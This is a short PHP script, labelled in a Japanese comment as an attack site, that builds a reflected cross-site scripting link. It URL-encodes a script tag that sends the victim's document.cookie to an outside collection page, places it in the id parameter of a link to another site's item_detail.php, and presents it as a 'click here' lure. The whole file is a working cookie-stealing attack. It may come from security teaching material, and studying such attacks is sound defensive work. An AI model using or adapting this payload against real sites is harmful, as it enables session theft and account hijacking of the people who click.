<?php
// xss.php（攻撃サイト）

$script = '<script>document.location="http://okumocchi.jp/php/get_cookie.php?cookie=" + document.cookie;</script>';
$script = urlencode($script);
echo '<a href = "http://okmt.cs.land.to/item_detail.php?id=' . $script . '">ここをClick！</a>';
?>
